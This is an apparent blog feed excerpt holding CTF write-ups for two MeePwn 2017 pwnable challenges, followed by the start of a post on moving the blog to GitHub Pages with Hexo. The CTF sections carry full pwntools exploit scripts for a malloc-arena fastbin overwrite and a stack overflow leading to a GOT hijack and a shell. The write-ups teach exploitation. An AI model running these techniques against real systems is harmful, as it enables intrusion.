&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;/* crackme check*/&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3233853430&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Good boy! Your license: %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Bad b0y!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, to solve this challenge, we’ll have to:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Pass the crackme check ( this is easy )&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Locate the &lt;code class=&quot;highlighter-rouge&quot;&gt;lic&lt;/code&gt; buffer at ( or near ) the &lt;code class=&quot;highlighter-rouge&quot;&gt;flag&lt;/code&gt; buffer&lt;/strong&gt;, so later we can leak the flag by print out the license content. We’ll focus on this one.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;First of all the program has a out-of-bound write vulnerability: by input a &lt;strong&gt;negative&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;index&lt;/code&gt;, we can overwrite the data at &lt;code class=&quot;highlighter-rouge&quot;&gt;buf[-XXX]&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Before we use this vulnerability to exploit the service, we’ll have to understand how the malloc work in different thread. When a thread wants to malloc a buffer, it will use its own &lt;code class=&quot;highlighter-rouge&quot;&gt;arena&lt;/code&gt; structure, a data structure which stores the malloc state of that thread ( check out the &lt;a href=&quot;https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#1648&quot;&gt;source code&lt;/a&gt; ). The &lt;code class=&quot;highlighter-rouge&quot;&gt;arena&lt;/code&gt; structure will also store the fastbin chunks’ address ( the &lt;code class=&quot;highlighter-rouge&quot;&gt;fastbinsY[NFASTBINS]&lt;/code&gt; member ).&lt;/p&gt;

&lt;p&gt;If we can control &lt;code class=&quot;highlighter-rouge&quot;&gt;fastbinsY[NFASTBINS]&lt;/code&gt;, we’ll be able to malloc a fastbin chunk at any address ( theoretically, since we’ll still need to bypass some check in malloc ). By using gdb, we can locate the thread &lt;code class=&quot;highlighter-rouge&quot;&gt;arena&lt;/code&gt;’s address is at &lt;code class=&quot;highlighter-rouge&quot;&gt;buf - 0x8a0&lt;/code&gt;, making us able to use the OOB write to overwrite its data structure.&lt;/p&gt;

&lt;p&gt;Now we’ll have to choose our fake chunk’s location. I decided to choose the address &lt;code class=&quot;highlighter-rouge&quot;&gt;0x6020bd&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ x/2gx 0x6020bd
0x6020bd:       0xfff7bb5540000000      0x000000000000007f   &amp;lt;-- fake fastbin chunk ( size = 0x70 )
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see that &lt;code class=&quot;highlighter-rouge&quot;&gt;0x6020bd&lt;/code&gt; is a good target of a fake fastbin[5] chunk ( size = 0x70 ). The &lt;code class=&quot;highlighter-rouge&quot;&gt;0x7f&lt;/code&gt; is a part of the &lt;code class=&quot;highlighter-rouge&quot;&gt;stderr&lt;/code&gt; address. Moreover, the &lt;code class=&quot;highlighter-rouge&quot;&gt;flag&lt;/code&gt; is at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x602101&lt;/code&gt; ( behind the fake chunk ) , so we can just pad some chars to the allocated chunk ( pad until it reach the beginning of the flag buffer ), later when the program print out the license content, it will give us the flag as well.&lt;/p&gt;

&lt;p&gt;So to sum up:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Use the OOB write to overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;fastbinsY[5]&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Choose the fake fastbin[5] chunk target at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x6020bd&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Input the data to bypass the crackme check&lt;/li&gt;
  &lt;li&gt;Input allocate size to make &lt;code class=&quot;highlighter-rouge&quot;&gt;malloc()&lt;/code&gt; allocate fastbin[5] ( size = 0x70 )&lt;/li&gt;
  &lt;li&gt;Pad the allocated buffer until it reach the &lt;code class=&quot;highlighter-rouge&quot;&gt;flag&lt;/code&gt; buffer&lt;/li&gt;
  &lt;li&gt;Print out the license and get the flag&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;```python exp_arena.py
#!/usr/bin/env python&lt;/p&gt;

&lt;p&gt;from pwn import *
import subprocess
import sys
import time&lt;/p&gt;

&lt;p&gt;HOST = “139.59.241.76”
PORT = 31335
ELF_PATH = “./anotherarena_noalarm”&lt;/p&gt;

&lt;p&gt;context.binary = ELF_PATH
context.log_level = ‘INFO’ # [‘CRITICAL’, ‘DEBUG’, ‘ERROR’, ‘INFO’, ‘NOTSET’, ‘WARN’, ‘WARNING’]
context.terminal = [‘tmux’, ‘splitw’] # for gdb.attach&lt;/p&gt;

&lt;p&gt;elf = context.binary # context.binary is an ELF object&lt;/p&gt;

&lt;p&gt;flag = 0x602101
fake_chunk = 0x6020bd&lt;/p&gt;

&lt;p&gt;def write(off, data):
    r.send(p32(off))
    time.sleep(0.5)
    r.send(p32(data))
    time.sleep(0.5)&lt;/p&gt;

&lt;p&gt;if &lt;strong&gt;name&lt;/strong&gt; == “&lt;strong&gt;main&lt;/strong&gt;”:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r = remote(HOST, PORT)

r.sendline(&quot;50&quot;)
time.sleep(0.5)
# move the offset to thread's arena + 0x30 ( fastbin[5], size=0x70 )
# fake chunk near stderr, use its 0x7f to create fake chunk
write(0xfffff790, fake_chunk)
# make final answer = 3233853430
write(0, 0x7fffffff)
write(4, 0x40c0af8f)

# break loop
r.send(p32(100)) 
time.sleep(0.5)

# allocate buf &amp;amp; pad to flag
r.sendline(&quot;104&quot;) # allocate 104 byte
time.sleep(0.5)
r.send(&quot;i&quot;*0x34) # pad to flag

r.interactive() ```
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;flag: &lt;code class=&quot;highlighter-rouge&quot;&gt;MeePwnCTF{oveRwrit3_another_(main)_arena}&lt;/code&gt;&lt;/p&gt;</content><author><name>Bruce Chen</name></author><category term="CTF" /><category term="Pwnable" /><category term="Python" /><category term="MeePwn" /><category term="heap" /><summary type="html">Category: Pwnable</summary></entry><entry><title type="html">MeePwn CTF 2017 – Old School</title><link href="http://0.0.0.0:4000/MeePwn-CTF-2017-Old-School/" rel="alternate" type="text/html" title="MeePwn CTF 2017 -- Old School" /><published>2017-07-16T17:56:00+08:00</published><updated>2017-07-16T17:56:00+08:00</updated><id>http://0.0.0.0:4000/MeePwn-CTF-2017-Old-School</id><content type="html" xml:base="http://0.0.0.0:4000/MeePwn-CTF-2017-Old-School/">&lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; Pwnable&lt;/p&gt;

&lt;p&gt;64 bit ELF, Partial RELRO, NX enabled, No PIE, has canary.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-------- BookStore --------
1.       Add Book.
2.       Edit Book.
3.       Delete Book.
4.       Show Books.
5.       Exit.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see we can add, edit, delete or show a book. Books are stored in a pointer array &lt;code class=&quot;highlighter-rouge&quot;&gt;books&lt;/code&gt;, each pointer point to a &lt;code class=&quot;highlighter-rouge&quot;&gt;book&lt;/code&gt; data structure:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;book&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;book_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;author&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;desc_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;desc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;books&lt;/code&gt; array and each &lt;code class=&quot;highlighter-rouge&quot;&gt;book&lt;/code&gt; pointer are all placed on the stack memory.&lt;/p&gt;

&lt;p&gt;The program did not initialize the &lt;code class=&quot;highlighter-rouge&quot;&gt;book&lt;/code&gt; variable before setting its data. Since there’s a libc address ( &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;atoi + 0x10&amp;gt;&lt;/code&gt; ) in it, we can leak the libc address by entering 4 characters in the description:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Choice:4
------------ 1 ------------
Name: 11111111
Author: 11111111
Description: AAAA�N���
-------- BookStore --------
1.       Add Book.
2.       Edit Book.
3.       Delete Book.
4.       Show Books.
5.       Exit.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After done some fuzzing, I also found that if we input 32 characters in &lt;code class=&quot;highlighter-rouge&quot;&gt;book_name&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;author&lt;/code&gt; ( no newline ) , the &lt;code class=&quot;highlighter-rouge&quot;&gt;desc_len&lt;/code&gt; will be overwritten with our input, and become a large integer. Since when we edit the book description, the length to read is depend on the &lt;code class=&quot;highlighter-rouge&quot;&gt;desc_len&lt;/code&gt; data, this make us able to overflow the &lt;code class=&quot;highlighter-rouge&quot;&gt;book-&amp;gt;description&lt;/code&gt; buffer and overwrite the pointers in the &lt;code class=&quot;highlighter-rouge&quot;&gt;books&lt;/code&gt; array !&lt;/p&gt;

&lt;p&gt;So here’s how I exploit the service:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;First leak the libc address&lt;/li&gt;
  &lt;li&gt;Overwrite the &lt;code class=&quot;highlighter-rouge&quot;&gt;desc_len&lt;/code&gt; data&lt;/li&gt;
  &lt;li&gt;Overflow the &lt;code class=&quot;highlighter-rouge&quot;&gt;books[0]-&amp;gt;desc&lt;/code&gt; buffer and overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;books[0]&lt;/code&gt;, let it point to the GOT section&lt;/li&gt;
  &lt;li&gt;Edit &lt;code class=&quot;highlighter-rouge&quot;&gt;books[0]&lt;/code&gt; and do the GOT hijacking ( hijack atoi to system )&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The exploit at the local side worked, but for some unknown reason, the service at the remote side has a different behavior: during the last step of the exploitation, it won’t let us input the &lt;code class=&quot;highlighter-rouge&quot;&gt;author&lt;/code&gt; data, thus failing our exploit. Although we can still pwn it by not entering the author’s name, it still took me a while to debug the whole process.&lt;/p&gt;

&lt;p&gt;```python exp_oldschool.py
#!/usr/bin/env python&lt;/p&gt;

&lt;p&gt;from pwn import *
import subprocess
import sys
import time&lt;/p&gt;

&lt;p&gt;HOST = “139.59.244.42”
PORT = 31340
ELF_PATH = “./oldschool_noalarm”
LIBC_PATH = “./libc6_2.23-0ubuntu7_amd64.so”&lt;/p&gt;

&lt;p&gt;context.binary = ELF_PATH
context.log_level = ‘INFO’ # [‘CRITICAL’, ‘DEBUG’, ‘ERROR’, ‘INFO’, ‘NOTSET’, ‘WARN’, ‘WARNING’]
context.terminal = [‘tmux’, ‘splitw’] # for gdb.attach&lt;/p&gt;

&lt;p&gt;elf = context.binary # context.binary is an ELF object
libc = ELF(LIBC_PATH)&lt;/p&gt;

&lt;p&gt;def add_book(book, author, dlen, desc):
    r.sendlineafter(“Choice:”, “1”)
    r.sendafter(“name:”, book)
    r.sendafter(“uthor:”, author)
    r.sendlineafter(“tion:”, str(dlen))
    r.sendafter(“tion:”, desc)&lt;/p&gt;

&lt;p&gt;def edit_book(idx, book, author, desc):
    r.sendlineafter(“Choice:”, “2”)
    r.sendlineafter(“?”, str(idx))
    r.sendafter(“name:”, book)
    r.sendafter(“uthor:”, author)
    r.sendafter(“tion:”, desc)&lt;/p&gt;

&lt;p&gt;def del_book(idx):
    r.sendlineafter(“Choice:”, “3”)
    r.sendlineafter(“?”, str(idx))&lt;/p&gt;

&lt;p&gt;def show_book():
    r.sendlineafter(“Choice:”, “4”)&lt;/p&gt;

&lt;p&gt;if &lt;strong&gt;name&lt;/strong&gt; == “&lt;strong&gt;main&lt;/strong&gt;”:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r = remote(HOST, PORT)
   
book, author = &quot;1&quot;*8+&quot;\n&quot;, &quot;a&quot;*8+&quot;\n&quot;  
add_book(book, author, 100, &quot;AAAA\n&quot;)
show_book()

# leak libc
r.recvuntil(&quot;AAAA&quot;)
libc.address = u64(r.recv(6).ljust(8, &quot;\x00&quot;)) - libc.symbols['atoi'] - 0x10
log.success(&quot;libc_base: &quot;+hex(libc.address))

del_book(1)
book, author = &quot;1&quot;*32, &quot;a&quot;*32  
# make book[0]-&amp;gt;size = very big
# later when we edit book[0]-&amp;gt;desc, it will overwrite the pointer of book[0]
add_book(book, author, 100, &quot;AAAA\n&quot;)
   
# edit book[1]-&amp;gt;desc, overwrite book[0]
# change book[0]-&amp;gt;name to got section
# later we can edit book[0] &amp;amp; do GOT hijacking
payload = &quot;i&quot;*503 + &quot;\x00&quot; + p32(1) + p64(0x602028) + &quot;\n&quot;
edit_book(1, &quot;1\n&quot;, &quot;1\n&quot;, payload)

# overwrite atoi to system
payload = &quot;i&quot;*4 + p64(libc.symbols['system']) + &quot;\n&quot;
book, author, desc = p64(0x400706)[:6:] , p64(0x4006f6)[:6:], payload
r.sendlineafter(&quot;Choice:&quot;, &quot;2&quot;)
r.sendlineafter(&quot;?&quot;, &quot;1&quot;)
r.sendafter(&quot;name:&quot;, book)
# don't know why author won't read input.....
#r.sendafter(&quot;uthor:&quot;, author)
r.sendafter(&quot;tion:&quot;, desc)
 
r.sendline(&quot;sh&quot;)
r.interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;```&lt;/p&gt;

&lt;p&gt;flag: &lt;code class=&quot;highlighter-rouge&quot;&gt;MeePwnCTF{0ld_sch00ld_C4n4ry_1s_0n_th3_st4ck}&lt;/code&gt;&lt;/p&gt;</content><author><name>Bruce Chen</name></author><category term="CTF" /><category term="Python" /><category term="Pwnable" /><category term="MeePwn" /><category term="BOF" /><summary type="html">Category: Pwnable</summary></entry><entry><title type="html">Migrate to Github Pages</title><link href="http://0.0.0.0:4000/Migrate-to-Github-Pages/" rel="alternate" type="text/html" title="Migrate to Github Pages" /><published>2017-05-30T07:31:00+08:00</published><updated>2017-05-30T07:31:00+08:00</updated><id>http://0.0.0.0:4000/Migrate-to-Github-Pages</id><content type="html" xml:base="http://0.0.0.0:4000/Migrate-to-Github-Pages/">&lt;p&gt;So I finally decided to migrate my blog from &lt;a href=&quot;http://logdown.com/&quot;&gt;Logdown&lt;/a&gt; to &lt;a href=&quot;https://pages.github.com/&quot;&gt;Github Pages&lt;/a&gt;. Took me about three days to get it done. Here I write down some notes to record the whole migration process.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h1 id=&quot;installing-hexo&quot;&gt;Installing Hexo&lt;/h1&gt;
&lt;p&gt;I chose &lt;a href=&quot;https://hexo.io/zh-tw/&quot;&gt;Hexo&lt;/a&gt; for my blog framework.&lt;/p&gt;

&lt;h2 id=&quot;environment-setting&quot;&gt;Environment Setting&lt;/h2&gt;
&lt;p&gt;First I prepared a &lt;a href=&quot;https://github.com/bruce30262/docker-misc/blob/master/hexo-blog/Dockerfile&quot;&gt;docker image&lt;/a&gt; for my blogging environment. Then I created two repositories on github:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/bruce30262/bruce30262.github.io&quot;&gt;bruce30262.github.io&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;The actual content of the blog. Hexo will update this repo after the deployment.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/bruce30262/bruce30262_blog&quot;&gt;bruce30262_blog&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;Content of the hexo framework ( markdown files, theme, config file…etc )&lt;/li&gt;
      &lt;li&gt;The docker container will mount this directory to the working directory, something like:
        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run -it --rm -p 4000:4000 -v [HOME_DIR]/bruce30262_blog:/app --name hexo-blog bruce30262/docker-misc:hexo-blog
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Later inside the container we can just run the hexo command under the &lt;code class=&quot;highlighter-rouge&quot;&gt;/app&lt;/code&gt; directory and start blogging.&lt;/p&gt;

&lt;h2 id=&quot;hexo-command&quot;&gt;Hexo command&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;hexo init&lt;/code&gt; : Initialize a hexo blog&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;hexo g(enerate)&lt;/code&gt; : Generate the static site&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;hexo s(erver)&lt;/code&gt; : Launch the blog at the local side ( for previewing )&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;hexo d(eploy)&lt;/code&gt; :
    &lt;ul&gt;
      &lt;li&gt;Deploy the blog to github pages.&lt;/li&gt;
      &lt;li&gt;To fully deploy the blog, use the &lt;code class=&quot;highlighter-rouge&quot;&gt;hexo g -d&lt;/code&gt; or the &lt;code class=&quot;highlighter-rouge&quot;&gt;hexo d -g&lt;/code&gt; command.&lt;/li&gt;
      &lt;li&gt;Before deploying the blog, we need to do some setting in &lt;code class=&quot;highlighter-rouge&quot;&gt;_config.yml&lt;/code&gt;:
        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  deploy:
type: git
repo: https://github.com/bruce30262/bruce30262.github.io.git
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;Don’t forget to install the &lt;strong&gt;hexo-deployer-git&lt;/strong&gt; plugin&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;hexo-plugin&quot;&gt;Hexo plugin&lt;/h2&gt;
&lt;p&gt;To install the hexo plugin:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;npm install [plugin_name] --save
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;hexo-deployer-git&lt;/code&gt; : For deploying the blog to github&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;hexo-admin&lt;/code&gt; : An admin interface for blogging&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;hexo-generator-sitemap&lt;/code&gt; : For generating sitemap&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;hexo-generator-feed&lt;/code&gt; : For generating atom.xml ( rss feed )&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;hexo-theme&quot;&gt;Hexo theme&lt;/h1&gt;
&lt;p&gt;I chose the &lt;a href=&quot;https://github.com/iissnan/hexo-theme-next&quot;&gt;NexT.Pisces&lt;/a&gt; theme. Here’s the &lt;a href=&quot;https://github.com/iissnan/hexo-theme-next/blob/master/README.en.md&quot;&gt;English&lt;/a&gt; and the &lt;a href=&quot;http://theme-next.iissnan.com/getting-started.html&quot;&gt;Chinese&lt;/a&gt; version of the theme’s documentations.&lt;/p&gt;

&lt;p&gt;To choose the Pisces scheme, modified the &lt;strong&gt;theme’s &lt;code class=&quot;highlighter-rouge&quot;&gt;_config.yml&lt;/code&gt;&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Schemes
#scheme: Muse
#scheme: Mist
scheme: Pisces    &amp;lt;-- remove the comment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;social-link&quot;&gt;Social link&lt;/h2&gt;
&lt;p&gt;In the &lt;strong&gt;site’s &lt;code class=&quot;highlighter-rouge&quot;&gt;_config.yml&lt;/code&gt;&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Social 
social:
  Github: your github link
  Twitter: your twitter linmk
  Facebook: your facebook link
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In the &lt;strong&gt;theme’s &lt;code class=&quot;highlighter-rouge&quot;&gt;_config.yml&lt;/code&gt;&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;social_icons:
  enable: true
  # Icon Mappings.
  # KeyMapsToSocialItemKey: NameOfTheIconFromFontAwesome
  Github: github
  Twitter: twitter
  Facebook: facebook 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;view-count--visitor-count&quot;&gt;View count &amp;amp; Visitor count&lt;/h2&gt;
&lt;p&gt;Enable the &lt;a href=&quot;http://busuanzi.ibruce.info/&quot;&gt;&lt;strong&gt;busuanzi&lt;/strong&gt; ( 不蒜子 )&lt;/a&gt; feature.
In the &lt;strong&gt;theme’s &lt;code class=&quot;highlighter-rouge&quot;&gt;_config.yml&lt;/code&gt;&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Show PV/UV of the website/page with busuanzi.
# Get more information on http://ibruce.info/2015/04/04/busuanzi/
busuanzi_count:
  # count values only if the other configs are false
  enable: true
  # custom uv span for the whole site
  site_uv: true
  site_uv_header: &amp;lt;i class=&quot;fa fa-user&quot;&amp;gt;&amp;lt;/i&amp;gt;
  site_uv_footer: Total visitors
  # custom pv span for the whole site
  site_pv: true
  site_pv_header: &amp;lt;i class=&quot;fa fa-eye&quot;&amp;gt;&amp;lt;/i&amp;gt;
  site_pv_footer: Total views
  # custom pv span for one page only
  page_pv: true
  page_pv_header: &amp;lt;i class=&quot;fa fa-eye&quot;&amp;gt;&amp;lt;/i&amp;gt;
  page_pv_footer: views
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;share-widget--addthis-&quot;&gt;Share widget ( AddThis )&lt;/h2&gt;
&lt;p&gt;First login to the &lt;a href=&quot;http://www.addthis.com/&quot;&gt;AddThis&lt;/a&gt; website, and create a share widget. Then, in the &lt;strong&gt;theme’s &lt;code class=&quot;highlighter-rouge&quot;&gt;_config.yml&lt;/code&gt;&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Share
#jiathis:
# Warning: JiaThis does not support https.
add_this_id: ra-XXXXXXXXXXXXX     &amp;lt;-- the pubid
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;migrate-disqus-comment&quot;&gt;Migrate Disqus comment&lt;/h2&gt;
&lt;p&gt;First enable the disqus feature.&lt;/p&gt;

&lt;p&gt;In the &lt;strong&gt;site’s &lt;code class=&quot;highlighter-rouge&quot;&gt;_config.yml&lt;/code&gt;&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;disqus_shortname: old_disqus_shortname   &amp;lt;-- old site's disqus shortname
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the &lt;strong&gt;theme’s &lt;code class=&quot;highlighter-rouge&quot;&gt;_config.yml&lt;/code&gt;&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Disqus
disqus:
  enable: true
  shortname: old_disqus_shortname   &amp;lt;-- old site's disqus shortname
  count: true    &amp;lt;-- display the comment count
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, follow the step from the &lt;a href=&quot;https://help.disqus.com/customer/portal/articles/912757-url-mapper&quot;&gt;disqus website&lt;/a&gt;, use the URL Mapper to migrate the disqus threads.&lt;/p&gt;

&lt;p&gt;Also change the setting in the disqus account ( new website url, &lt;a href=&quot;https://help.disqus.com/customer/portal/articles/1261429-how-to-use-trusted-domains&quot;&gt;add trust domains&lt;/a&gt;…etc ). It will take a while for disqus to reset the whole thing.&lt;/p&gt;

&lt;h1 id=&quot;migrate-the-blog&quot;&gt;Migrate the blog&lt;/h1&gt;
&lt;ol&gt;
